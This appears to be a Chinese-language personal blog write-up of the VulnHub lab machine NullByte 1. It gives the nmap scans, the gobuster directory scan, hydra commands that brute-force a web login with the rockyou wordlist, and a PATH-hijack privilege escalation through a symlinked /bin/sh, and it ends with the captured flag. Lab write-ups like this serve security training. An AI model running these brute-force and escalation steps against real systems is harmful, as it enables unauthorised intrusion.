+++
title = '0x001 NullByte 1'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'vulnhub'
+++



# IP发现&端口扫描

```
sudo nmap -Pn -sS -p- --min-rate 10000 192.168.154.0/24
```

![](/vulnhub_img/WEBRESOURCE51a6e0215fb9c3cebfcf5ca850a3aabd截图.png)

```
sudo nmap -Pn -sV -p 80,111,777,42557 --min-rate 10000 192.168.154.129
```

![](/vulnhub_img/WEBRESOURCE1440a52bba0d13119375a35bb5d91007截图.png)

# 目录扫描

```
gobuster dir -u http://192.168.154.129/ -w /usr/share/wordlists/dirb/common.txt
```

![](/vulnhub_img/WEBRESOURCEb1eb9f90b824cdd50b178a4e85082979截图.png)

# 发现隐藏信息的图片，有路径

```
命令：exiftool main.gif
```

# 根据提示进行爆破，hydra http 爆破

示例：

解释表单参数，“路径:用户名:密码:F=错误返回”

```text
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^password=^PASS^:F=Invalid" -t 64
```

抓包看提交参数，这里经过摸索，使用-e n 参数来只爆破用户名

完整命令如下：

```
hydra -L /usr/share/wordlists/rockyou.txt -e n 192.168.154.129 http-post-form "/kzMb5nVYJw/index.php:key=^USER^:F=invalid" -t 60
```

获得账号：elite

![](/vulnhub_img/WEBRESOURCE685e129e46e63fad64e61d8f8010a2a2截图.png)

# SQL注入

![](/vulnhub_img/WEBRESOURCEcbc84a3ac2d9f43525d3ace151bdd022截图.png)

# 破解hash，Base64解码一下

![](/vulnhub_img/WEBRESOURCEa7afcc6b8b1e2bda6028950386326cd4截图.png)

# 翻查敏感信息

修复文件?

![](/vulnhub_img/WEBRESOURCE98de53f7ca8b73524c3345126a406676截图.png)

数据库密码登录失败：

![](/vulnhub_img/WEBRESOURCE2a2c03696ff2aa3548238b913ef2d433截图.png)

修复方式不清楚，看了WP，history内有提示：

![](/vulnhub_img/WEBRESOURCEe862cd1dc166a4359be8616e2e2b3e81截图.png)

运行：

![](/vulnhub_img/WEBRESOURCEab46364737416c405c67e5b628016630截图.png)

# 提权

```
ln -s /bin/sh ps
export PATH=.:$PATH
```

flag:adf11c7a9e6523e630aaf3b9b7acb51d

![](/vulnhub_img/WEBRESOURCEd2db86749c1054315bab21a61de0f601截图.png)

